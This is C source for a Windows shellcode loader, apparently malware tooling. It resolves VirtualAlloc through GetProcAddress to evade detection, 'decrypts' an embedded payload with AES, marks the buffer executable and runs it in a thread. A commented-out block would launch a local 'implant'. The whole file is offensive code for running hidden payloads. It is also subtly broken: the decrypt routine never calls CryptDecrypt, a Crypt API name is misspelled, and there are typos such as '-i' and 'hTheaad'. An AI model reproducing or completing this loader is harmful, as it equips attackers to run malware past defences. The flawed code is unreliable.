#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTPROV hHash;
	HCRYPTPROV hKey;

	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDerieKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

unsigned char payload[] = {};
unsigned char key[] = {};

//int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	//FreeConsole();

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );


	pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), "RtlMoveMemory");

	unsigned int payload_len = sizeof(payload);

	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Decrypt payload
	AESDecrypt((char*) payload, payload_len, key, sizeof(key));

	//Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch payload

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -i);
	}
	
	//Sleep(60000);
	//}

/*
	if (!CreateProcess( NULL, // No module
				"C:\\path\\to\\implant",
				NULL, 					// Process handle not inheritable
				NULL,					// Thread handle not inheritable
				FALSE,					// Set handle inheritance to FALSE
				0,					// No creation flags
				NULL,					// Use parent's environment block
				NULL,					// Use parent's starting directory
				&si,					// Pointer to STARTPINFO structure
				&pi)					// Pointer to PROCESS_INFORMATION structure
			) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return;
	}
	WaitForSingleObject( pi.hProcess, INFINITE );

	// Close process and thread handles.
	CloseHandle( pi.hProcess );
	CloseHandle( pi.hTheaad );
*/
	return 0;
}	